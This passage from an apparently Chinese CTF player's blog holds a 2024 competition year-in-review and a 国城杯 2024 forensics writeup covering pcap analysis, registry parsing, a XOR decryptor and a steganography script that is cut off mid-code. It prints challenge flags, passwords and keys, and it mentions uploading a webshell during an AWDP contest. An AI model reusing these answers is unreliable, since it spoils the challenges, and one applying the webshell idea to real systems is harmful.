Orz</p><p>但是到我们这届没落了(我们这届无pwn，web手由于还打算法所以经常会没空，密码手在十一月才加入战斗，一个re和两个misc<del>，这玩毛线</del></p><p>希望下一届能Make X1cT34m Great Again吧 :(</p><h3 id="xyctf">XYCTF</h3><p>wp: <ahref="https://www.blog.st4rr.top/2024/04/29/2024-04-29-XYCTF2024-Writeup/">点我</a></p><p>也是和f4k3r一起打的，记得好像由于持续时间太长，到后面摆了()</p><h2 id="月-4">5月</h2><h3 id="ciscn初赛">CISCN初赛</h3><p>wp: <ahref="https://www.blog.st4rr.top/2024/05/19/CISCN2024-Writeup/">点我</a></p><p>当时我们届已经加入校队的四个(wuming, 1n1t, w8nn9z,St4rr)一起组了个X2cT34m打的，学长们是X1cT34m。我们队由于没有crypto，我在打misc的同时还顺带负责看了一眼crypto。学长们毫无悬念的晋级了，我们是压线晋级的。</p><figure><img src="/images/2024年度总结/image-20250122135739611.png"alt="image-20250122135739611" /><figcaption aria-hidden="true">image-20250122135739611</figcaption></figure><h3 id="京麒ctf初赛">京麒CTF初赛</h3><p>wp: <ahref="https://www.blog.st4rr.top/2024/05/26/jqctf2024%E5%88%9D%E8%B5%9B-Misc/">点我</a></p><p>这次真就纯靠学长们发力了，直接给干到了第一名Orz 我贡献了一个misc</p><p><img src="/images/2024年度总结/IMG_5411(20250122-140341).PNG" alt="IMG_5411(20250122-140341)" style="zoom: 25%;" /></p><h2 id="月-5">6月</h2><h3 id="litctf">LitCTF</h3><p>wp: <ahref="https://www.blog.st4rr.top/2024/06/01/LitCTF2024-Writeup/">点我</a></p><p>一个人打的，打爽了，但没有奖品</p><figure><img src="/images/2024年度总结/7d5495c151445252fb4f98e7e9c55bfc_720.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="ciscn华东北赛区赛">CISCN华东北赛区赛</h3><p>wp: <ahref="https://www.blog.st4rr.top/2024/05/19/CISCN2024-Writeup/">点我</a></p><p>第一次打线下赛，还是awdp模式。由于我们队都是菜狗，面对题目一脸懵逼，所以只拿了个三等奖，然后遗憾退场。学长们一如既往地强，他们的队伍进了决赛，然后最终拿到了国一Orz</p><p>后来听学长说，赛区赛他做的系统其实有问题，可以直接通过patch传个马上去然后再攻击就行了。好吧其实我在比赛时也想到了这个方法，跟我们队的web手说了这个想法后他尝试了一下告诉我没成功，然后我也就没去试，想着主办方应该不会犯这么低级的错误。。。所以也就没去试。。。:(</p><figure><img src="/images/2024年度总结/21797C860C0B27C72092B0E2E891CBD6.png"alt="21797C860C0B27C72092B0E2E891CBD6" /><figcaptionaria-hidden="true">21797C860C0B27C72092B0E2E891CBD6</figcaption></figure><figure><img src="/images/2024年度总结/4B6473F4627BEF60D6943B46E51C06ED.png"alt="4B6473F4627BEF60D6943B46E51C06ED" /><figcaptionaria-hidden="true">4B6473F4627BEF60D6943B46E51C06ED</figcaption></figure><p><imgsrc="/images/2024年度总结/8FFCC683F28A481BE7BE693351986628.png" /></p><h2 id="月-6">7月</h2><p>一直只是在练习CTF，没打比赛</p><h2 id="月-7">8月</h2><h3 id="加入星盟预备队hyperion">加入星盟预备队Hyperion</h3><p>由于我们这届校队的配置要打比赛实在是绠短汲深，因此我决定去加入联队。星盟看起来挺强的，各大比赛也算是榜上有名，另外根据其招新标准我掂量着自己应该能达到，于是我试着向星盟投了简历。</p><p>misc方向当时总共给了两道招新题，我在一天内就都做出来了，也顺利通过了面试，遂成功进入了星盟的预备队。</p><p><img src="/images/2024年度总结/DEF5B71D48D6FAE5FAB1B0CF9193604D.png" alt="DEF5B71D48D6FAE5FAB1B0CF9193604D" style="zoom: 25%;" /></p><h3 id="京麒ctf决赛">京麒CTF决赛</h3><p>wp: <ahref="https://www.blog.st4rr.top/2024/08/08/jqctf2024%E5%86%B3%E8%B5%9B-Misc-kerberoasting%E5%A4%8D%E7%8E%B0/">点我</a></p><p>和几位学长一起去北京京东总部参加了京麒CTF的决赛。</p><p>misc一共两题，ai的那个学长做出来了，另一个kerberoasting的流量分析我对着看了一天愣是没做出来，遂成功爆零o(╥﹏╥)o</p><p>这道题总共是有三个小问，要求提交的是三个小问的答案拼在一起的结果。结果赛后复现时我发现，原来我一开始的答案就有两个小问是对的，然而由于我不知道到底有几个小问错，所以一直在那不停地改，然后越改越离谱。。。</p><p>最终排名过低，只拿了个优胜奖 :(</p><p>不过也是有机会见识到了京东总部，这一趟来的还是挺值的</p><p><img src="/images/2024年度总结/IMG_3622.JPG" alt="IMG_3622"  /></p><figure><img src="/images/2024年度总结/IMG_3630.JPG" alt="IMG_3630" /><figcaption aria-hidden="true">IMG_3630</figcaption></figure><figure><img src="/images/2024年度总结/2A38D14BF8619B1DE00BA5FDD42E1077.png"alt="2A38D14BF8619B1DE00BA5FDD42E1077" /><figcaptionaria-hidden="true">2A38D14BF8619B1DE00BA5FDD42E1077</figcaption></figure><figure><img src="/images/2024年度总结/IMG_3634.JPG" alt="IMG_3634" /><figcaption aria-hidden="true">IMG_3634</figcaption></figure><p><img src="/images/2024年度总结/36279bb0462f43e45d0cb63c90079c54.JPG" alt="36279bb0462f43e45d0cb63c90079c54" style="zoom: 25%;" /></p><h3 id="moectf">MoeCTF</h3><p>wp: <ahref="https://www.blog.st4rr.top/2024/08/16/MoeCTF2024-Writeup/">点我</a></p><p>一个新生赛，就看了第一周，题挺不错的</p><h3 id="巅峰极客初赛">巅峰极客初赛</h3><p>wp: <ahref="https://www.blog.st4rr.top/2024/08/19/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024%E5%88%9D%E8%B5%9B-Misc-%E7%AE%80%E5%8E%86%E5%A4%8D%E7%8E%B0/">点我</a></p><p>跟校队打的，抽象比赛，一开赛发现全是web，其他方向都只有一题，然而我们的web手缺席。。。未晋级</p><p>唯一的一道misc，都已经做到最后一步了，结果卡住了。。。这是我第一次做到病毒分析题，也是学到了。</p><figure><img src="/images/2024年度总结/巅峰极客2024.jpeg" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="nepctf">NepCTF</h3><p>wp: <ahref="https://www.blog.st4rr.top/2024/08/26/NepCTF2024-Writeup/">点我</a></p><p>nepnep办的个人赛，不会别的所以只做了misc，第一次学到了区块链的重入攻击。</p><p>最终拿了个方向优胜奖。</p><figure><img src="/images/2024年度总结/image-20250122181252381.png"alt="image-20250122181252381" /><figcaption aria-hidden="true">image-20250122181252381</figcaption></figure><h3 id="羊城杯初赛">羊城杯初赛</h3><p>wp: <ahref="https://www.blog.st4rr.top/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-Writeup/">点我</a></p><p>跟校队打的，记得misc有很多脑洞题，根本想不到<del>（好吧就是我太菜了）</del>。显然未晋级</p><h2 id="月-8">9月</h2><h3 id="长城杯初赛">长城杯初赛</h3><p>wp: <ahref="https://www.blog.st4rr.top/2024/09/08/%E9%95%BF%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-misc-Writeup/">点我</a></p><p>跟校队打的，两个misc手+一个re手组队。。。不用说了</p><p>记得这个比赛的misc挺简单的，很轻松就ak了。其他方向想做但是一点不懂。。。是时候该学点其他方向了</p><h3 id="bytectf初赛">ByteCTF初赛</h3><p>wp: <ahref="https://www.blog.st4rr.top/2024/09/22/ByteCTF2024%E5%88%9D%E8%B5%9B-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/">点我</a></p><p>这次比赛有学长参加，所以成功晋级了()</p><p>但是我misc又爆零了。。。但是通过复现又学到了不少东西</p><figure><img src="/images/2024年度总结/130E289D33E160CB0F1D095AB2928855.png"alt="130E289D33E160CB0F1D095AB2928855" /><figcaptionaria-hidden="true">130E289D33E160CB0F1D095AB2928855</figcaption></figure><h3 id="wmctf">WMCTF</h3><p>wp: <ahref="https://www.blog.st4rr.top/2024/09/24/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/">点我</a></p><p>从这开始比赛基本都是跟星盟预备队打的了</p><p>但是这个比赛我又爆零了。。。光是zysgmzb学长出的两道题就够顶了Orz好好复现了一下，知识++</p><p>未得奖:(</p><h3 id="sctf">SCTF</h3><p>跟星盟预备队打的，贡献了一道misc :)</p><p>还有一个misc看了半天没做出来，好好复现了一下。</p><p>这个比赛中还有两个crypto，我都是做了一半没做出来，幸亏队里的密码手给力做出来了<del>，我终于不用在打misc的时候再去顾着其他方向了</del>:)</p><p>赛后复现发现原来是我不会二元coppersmith:(</p><h2 id="月-9">10月</h2><h3 id="御宛杯">御宛杯</h3><p>wp: <ahref="https://www.blog.st4rr.top/2024/10/15/%E5%BE%A1%E5%AE%9B%E6%9D%AF2024-Writeup/">点我</a></p><p>一个个人赛，打爽了，至少取证做爽了()</p><p>拿了个二等奖<del>（这奖状一定是来搞笑的）</del></p><p><img src="/images/2024年度总结/季博杯.png" alt="季博杯" style="zoom:50%;" /></p><h3 id="办赛0xgame">办赛0xGame</h3><p>misc官方wp: <ahref="https://www.blog.st4rr.top/2024/11/11/0xGame2024-Misc-Official-Writeup/">点我</a></p><p>去年还在坐牢，今年也是当起出题人了()</p><p>今年0xGame2024的misc方向（包括osint, blockchain,forensics）是我和w8nn9z一起出的，出题好难，比做题还难:(</p><p>第一次出题，出的不好还请师傅们多多包涵()毕竟往年的题都是zysgmzb学长出的，这题目质量相较往年肯定一下子就下来了:(</p><p>这一届小登有几个还是挺强的，比我去年同期强多了，邮专校队又有希望了:)</p><h3 id="强网拟态初赛">强网拟态初赛</h3><p>wp: <ahref="https://www.blog.st4rr.top/2024/10/21/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/">点我</a></p><p>跟校队打的，贡献了一道crypto，两道misc:)</p><p>还有两道misc有点脑洞，实在想不到<del>（是我太菜了）</del></p><p>未晋级:(</p><h3 id="bytectf决赛">ByteCTF决赛</h3><p>全靠学长，纯去北京玩了一趟()</p><p><img src="/images/2024年度总结/94850E62CF9F2AC2207DFD07D86C849D.png" alt="94850E62CF9F2AC2207DFD07D86C849D" style="zoom: 25%;" /></p><h3 id="buildctf">BuildCTF</h3><p>wp: <ahref="https://www.blog.st4rr.top/2024/10/29/BuildCTF2024-Writeup/">点我</a></p><p>就花了一晚上看一看<del>，妄想着冲冲分</del></p><h2 id="月-10">11月</h2><h3 id="强网杯初赛">强网杯初赛</h3><p>wp: <ahref="https://www.blog.st4rr.top/2024/11/05/%E5%BC%BA%E7%BD%91%E6%9D%AF2024-Misc-%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5-0-Writeup/">点我</a></p><p>跟星盟预备队打的，贡献了一个misc，另有一个misc是跟aura爷一起做的，aura贡献比较大，我就没写wp<del>（我懒）</del></p><p>又见识到了新题型:)</p><p>这次排名是第60名，对预备队来说其实挺不错的，可惜还是未晋级</p><h3 id="网鼎杯初赛">网鼎杯初赛</h3><p>跟星盟预备队报的玄武组，你猜这里我为什么没放wp，诶，我爆零了</p><p>:(</p><p>其实这把我应该跟校队报青龙组的，听说挺容易晋级的。而玄武组是人数多，晋级名额又少。</p><p>:(</p><h3 id="美亚杯线下赛">美亚杯线下赛</h3><p>跟校队的1n1t和w8nn9z师傅一起去厦门打了美亚杯的线下赛。</p><p>然而我太菜了，个人资格赛环节就被淘汰了:(总结一下原因，我做题速度太慢了，而且准备不充分，当时对手机取证还是过于生疏所以浪费了大量的时间。</p><p>幸亏另外两位师傅比较给力，仅凭两个人在团体赛中还是拿了个三等奖Orz</p><p>明年再来，一雪前耻。</p><p><img src="/images/2024年度总结/IMG_4636.JPG" alt="IMG_4636" style="zoom:25%;" /></p><p><img src="/images/2024年度总结/IMG_4634.JPG" alt="IMG_4634" style="zoom: 50%;" /></p><figure><imgsrc="/images/2024年度总结/7D8B5131-79D1-4DA6-BB91-54B63C523B1E-2027-0000010.jpg"alt="7D8B5131-79D1-4DA6-BB91-54B63C523B1E-2027-0000010" /><figcaptionaria-hidden="true">7D8B5131-79D1-4DA6-BB91-54B63C523B1E-2027-0000010</figcaption></figure><h3 id="极客大挑战">极客大挑战</h3><p>wp: <ahref="https://www.blog.st4rr.top/2024/11/19/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982024-Writeup/">点我</a></p><p>跟w8nn9z一起组队打了极客大挑战，打爽了，拿了个三等奖</p><p>题挺不错的，又学到了</p><figure><img src="/images/2024年度总结/image-20250122175410977.png"alt="image-20250122175410977" /><figcaption aria-hidden="true">image-20250122175410977</figcaption></figure><h3 id="升入星盟主队polaris">升入星盟主队Polaris</h3><p>根据星盟的考核标准，我尝试申请了升队。</p><p>经过考核，没想到真的成功了，就此加入了星盟主队，成为了正式成员。</p><p><del>也许是星盟对misc手还是比较缺吧</del></p><h2 id="月-11">12月</h2><h3 id="吾杯">吾杯</h3><p>wp: <ahref="https://www.blog.st4rr.top/2024/12/05/%E5%90%BE%E6%9D%AF2024-Writeup/">点我</a></p><p>个人赛，打着玩玩</p><p>给的获奖名额特别多，拿了个二等奖</p><figure><img src="/images/2024年度总结/屏幕截图%202025-01-22%20172551.png"alt="屏幕截图 2025-01-22 172551" /><figcaption aria-hidden="true">屏幕截图 2025-01-22 172551</figcaption></figure><h3 id="国城杯初赛">国城杯初赛</h3><p>wp: <ahref="https://www.blog.st4rr.top/2024/12/07/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/">点我</a></p><p>跟校队的几位师傅一起打的，这时候我们有了密码手。</p><p>这个比赛的难度还可以，比较适合我们食用。但可惜的是，这个比赛的pwn从解题人数来看应该都不难，加上这几题的分我们完全可以晋级，而我们缺的就是pwn手。。。因此，我们又与晋级失之交臂。</p><p>有两个misc没做出来，复现了，学到了。</p><h3 id="cn-fnst">cn-fnst</h3><p>wp: <ahref="https://www.blog.st4rr.top/2024/12/15/cn-fnst2024-Writeup/">点我</a></p><p>跟两个小登一起打的cn-fnst，我做了个占分比较高的题直接给干到第三名了，拿了个二等奖</p><p><img src="/images/2024年度总结/龙鳞小队.png" alt="龙鳞小队" style="zoom: 25%;" /></p><p><del>不是你奖我个这个(?</del></p><p><img src="/images/2024年度总结/IMG_5418.JPG" alt="IMG_5418" style="zoom:25%;" /></p><h2 id="结语">结语</h2><p>写完上面的年度报告，突然感觉自己初入网安这一年的进步具象化起来，很高兴能看到自己逐步踏入网安的门槛。</p><p>不过宏观来看，我仍然只是个网安萌新，我看到的甚至还不到冰山的一角。我仍然需要不断地学习进步，磨练自己的技术。</p><p>未来的一年，希望我能够拿到一些大比赛的奖，在比赛中多做出一点贡献。另外，感觉光打misc对于网安来说是远远不够的，我必须再学一门其他方向，目前暂定web吧，想学点具有实战意义的东西。</p><p>下面再贴一张我在交星盟年报时做的个人技能树吧。</p><p><img src="/images/2024年度总结/2024年度总结.jpg" alt="2024年度总结" style="zoom: 25%;" /></p>]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 年度总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cn-fnst2024 Writeup</title>
      <link href="/posts/539449f8/"/>
      <url>/posts/539449f8/</url>
      
        <content type="html"><![CDATA[<blockquote><p><del>小登们带我飞</del></p></blockquote><p><ahref="https://www.blog.st4rr.top/writeups/cn-fnst2024Writeup.pdf">Wrtieup点我</a></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> cn-fnst </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>国城杯2024 Writeup</title>
      <link href="/posts/e40160ef/"/>
      <url>/posts/e40160ef/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这次跟校队的几位同届的大师傅一起打的，师傅们都很强，又是被师傅们带着冲的一集。可惜我们缺个pwn手，这次的pwn从解题人数来看应该不难，但是我们一题都没做。。。</p></blockquote><h2 id="writeup部分">Writeup部分</h2><h4 id="writeup点我"><ahref="https://www.blog.st4rr.top/writeups/国城杯2024Writeup.pdf">Writeup点我</a></h4><h2 id="复现部分">复现部分</h2><blockquote><p>不懂的还是太多了，好好复现一下吧。</p></blockquote><h3 id="misc">Misc</h3><h4 id="just_f0r3n51cs">Just_F0r3n51Cs</h4><blockquote><p>这题当时是找到了第三第四个flag，第一个flag找到了密钥但是没找到密文。</p></blockquote><h5 id="flag1">flag1</h5><p>在桌面上可以找到beginning.pcapng</p><figure><img src="/images/国城杯2024-Writeup/image-20241207185904257.png"alt="image-20241207185904257" /><figcaption aria-hidden="true">image-20241207185904257</figcaption></figure><p>追踪一下http流可以看到传输了一张jpg图片，保存下来</p><figure><img src="/images/国城杯2024-Writeup/image-20241207190018698.png"alt="image-20241207190018698" /><figcaption aria-hidden="true">image-20241207190018698</figcaption></figure><p>图片结尾有一串base64</p><figure><img src="/images/国城杯2024-Writeup/image-20241207190302519.png"alt="image-20241207190302519" /><figcaption aria-hidden="true">image-20241207190302519</figcaption></figure><p>解出来提示oursecret，用oursecret提取得到hidden.txt</p><figure><img src="/images/国城杯2024-Writeup/image-20241207190353388.png"alt="image-20241207190353388" /><figcaption aria-hidden="true">image-20241207190353388</figcaption></figure><figure><img src="/images/国城杯2024-Writeup/image-20241207190505330.png"alt="image-20241207190505330" /><figcaption aria-hidden="true">image-20241207190505330</figcaption></figure><p>内容如下</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ECB&#x27;s key is</span><br><span class="line">N11c3TrYY6666111</span><br><span class="line">记得给我秋秋空间点赞</span><br></pre></td></tr></table></figure><p>查看流量包中的oicq流，可以看到一个QQ号</p><figure><img src="/images/国城杯2024-Writeup/image-20241207190631379.png"alt="image-20241207190631379" /><figcaption aria-hidden="true">image-20241207190631379</figcaption></figure><p>看一下其空间，找到密文</p><p><img src="/images/国城杯2024-Writeup/FEFD121B2F9676AB28DFE7834E11BB28.png" alt="FEFD121B2F9676AB28DFE7834E11BB28" style="zoom:50%;" /></p><figure><img src="/images/国城杯2024-Writeup/image-20241207190927635.png"alt="image-20241207190927635" /><figcaption aria-hidden="true">image-20241207190927635</figcaption></figure><h5 id="flag2">flag2</h5><p>找到SYSTEM，右键解析注册表</p><figure><img src="/images/国城杯2024-Writeup/image-20241207191051755.png"alt="image-20241207191051755" /><figcaption aria-hidden="true">image-20241207191051755</figcaption></figure><p>查看环境变量，找到第二个flag存放的路径，前往将其导出</p><figure><img src="/images/国城杯2024-Writeup/image-20241207191309431.png"alt="image-20241207191309431" /><figcaption aria-hidden="true">image-20241207191309431</figcaption></figure><p>文件名字叫2，但是从特征不难发现这是个压缩包，有注释。</p><figure><img src="/images/国城杯2024-Writeup/image-20241207191511072.png"alt="image-20241207191511072" /><figcaption aria-hidden="true">image-20241207191511072</figcaption></figure><p>根据要求找到相关信息，得到密码D0g3xGC_Windows_7_Ultimate_115.0</p><figure><img src="/images/国城杯2024-Writeup/image-20241207192038615.png"alt="image-20241207192038615" /><figcaption aria-hidden="true">image-20241207192038615</figcaption></figure><figure><img src="/images/国城杯2024-Writeup/image-20241207192104491.png"alt="image-20241207192104491" /><figcaption aria-hidden="true">image-20241207192104491</figcaption></figure><p>base85</p><figure><img src="/images/国城杯2024-Writeup/image-20241207192304255.png"alt="image-20241207192304255" /><figcaption aria-hidden="true">image-20241207192304255</figcaption></figure><h5 id="flag3">flag3</h5><p>不难找到original.zip，到处都是它的痕迹。同时在图片文件夹下可以找到一张特殊的图片。</p><figure><img src="/images/国城杯2024-Writeup/image-20241207192522212.png"alt="image-20241207192522212" /><figcaption aria-hidden="true">image-20241207192522212</figcaption></figure><p>压缩包有注释</p><figure><img src="/images/国城杯2024-Writeup/image-20241207192609657.png"alt="image-20241207192609657" /><figcaption aria-hidden="true">image-20241207192609657</figcaption></figure><p>根据要求找到相关信息，得到密码qwe123!@#_Y0u_f1Nd<sup>_</sup>m3_233</p><figure><img src="/images/国城杯2024-Writeup/image-20241207192723500.png"alt="image-20241207192723500" /><figcaption aria-hidden="true">image-20241207192723500</figcaption></figure><figure><img src="/images/国城杯2024-Writeup/image-20241207192801229.png"alt="image-20241207192801229" /><figcaption aria-hidden="true">image-20241207192801229</figcaption></figure><figure><img src="/images/国城杯2024-Writeup/image-20241207192901376.png"alt="image-20241207192901376" /><figcaption aria-hidden="true">image-20241207192901376</figcaption></figure><p>根据水印图片的名字CatWaterMark_666.png可知，用github上的<ahref="https://github.com/Konano/CatWatermark">这个工具</a>提取盲水印，参数为666</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python decode.py Original.png CatWaterMark_666.png output.png 6 6 6</span><br></pre></td></tr></table></figure><figure><img src="/images/国城杯2024-Writeup/image-20241207193442527.png"alt="image-20241207193442527" /><figcaption aria-hidden="true">image-20241207193442527</figcaption></figure><h5 id="flag4">flag4</h5><p>不难找到flag4.zip，到处都是它的痕迹。</p><figure><img src="/images/国城杯2024-Writeup/image-20241207193653243.png"alt="image-20241207193653243" /><figcaption aria-hidden="true">image-20241207193653243</figcaption></figure><p>flag4.zip里面有个python打包的exe和一个加密的bin文件，python逆向一下</p><figure><img src="/images/国城杯2024-Writeup/image-20241207194149584.png"alt="image-20241207194149584" /><figcaption aria-hidden="true">image-20241207194149584</figcaption></figure><figure><img src="/images/国城杯2024-Writeup/image-20241207194230130.png"alt="image-20241207194230130" /><figcaption aria-hidden="true">image-20241207194230130</figcaption></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.9.1</span></span><br><span class="line"><span class="comment"># Python bytecode version base 3.8.0 (3413)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.10.11 (tags/v3.10.11:7d4cc5a, Apr  5 2023, 00:38:17) [MSC v.1929 64 bit (AMD64)]</span></span><br><span class="line"><span class="comment"># Embedded file name: enc_png.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_encrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    encrypted_data = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        encrypted_data.append(data[i] ^ key[i % <span class="built_in">len</span>(key)])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> encrypted_data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        data = file.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_file</span>(<span class="params">file_path, data</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_file</span>(<span class="params">input_file_path, output_file_path, key</span>):</span><br><span class="line">    data = read_file(input_file_path)</span><br><span class="line">    encrypted_data = xor_encrypt(data, key)</span><br><span class="line">    write_file(output_file_path, encrypted_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    key = <span class="string">b&#x27;GCcup_wAngwaNg!!&#x27;</span></span><br><span class="line">    input_file = <span class="string">&quot;flag4.png&quot;</span></span><br><span class="line">    encrypted_file = <span class="string">&quot;flag4_encrypted.bin&quot;</span></span><br><span class="line">    encrypt_file(input_file, encrypted_file, key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># okay decompiling enc_png.pyc</span></span><br></pre></td></tr></table></figure><p>什么都不用改就能解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">xor_decrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    encrypted_data = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        encrypted_data.append(data[i] ^ key[i % <span class="built_in">len</span>(key)])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> encrypted_data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        data = file.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_file</span>(<span class="params">file_path, data</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_file</span>(<span class="params">input_file_path, output_file_path, key</span>):</span><br><span class="line">    data = read_file(input_file_path)</span><br><span class="line">    decrypted_data = xor_decrypt(data, key)</span><br><span class="line">    write_file(output_file_path, decrypted_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    key = <span class="string">b&#x27;GCcup_wAngwaNg!!&#x27;</span></span><br><span class="line">    input_file = <span class="string">&quot;flag4_encrypted.bin&quot;</span></span><br><span class="line">    decrypted_file = <span class="string">&quot;flag4.png&quot;</span></span><br><span class="line">    decrypt_file(input_file, decrypted_file, key)</span><br></pre></td></tr></table></figure><p>flag4.png:</p><figure><img src="/images/国城杯2024-Writeup/asynccode" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>合起来</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D0g3xGC&#123;Y0u_h4V3_f0und_7H3_F1N4L_s3CR3t_0F_Th15_F0R3N51c5_Ch4Ll3N93&#125;</span><br></pre></td></tr></table></figure><h4 id="ez_steg0">eZ_Steg0</h4><p>图片名叫01.png，写个python脚本遍历每个像素，黑色记为0，白色记为1，输出二进制字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">image_to_binary_string</span>(<span class="params">image_path, threshold=<span class="number">127</span></span>):</span><br><span class="line">    <span class="keyword">with</span> Image.<span class="built_in">open</span>(image_path) <span class="keyword">as</span> img:</span><br><span class="line">        img = img.convert(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line">        binary_string = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(img.height):</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(img.width):</span><br><span class="line">                pixel_value = img.getpixel((x, y))</span><br><span class="line">                <span class="keyword">if</span> pixel_value &lt; threshold:</span><br><span class="line">                    binary_string += <span class="string">&quot;0&quot;</span> </span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    binary_string += <span class="string">&quot;1&quot;</span> </span><br><span class="line">    <span class="keyword">return</span> binary_string.strip() </span><br><span class="line">image_path = <span class="string">&#x27;01.png&#x27;</span> </span><br><span class="line">result_string = image_to_binary_string(image_path)</span><br><span class="line"><span 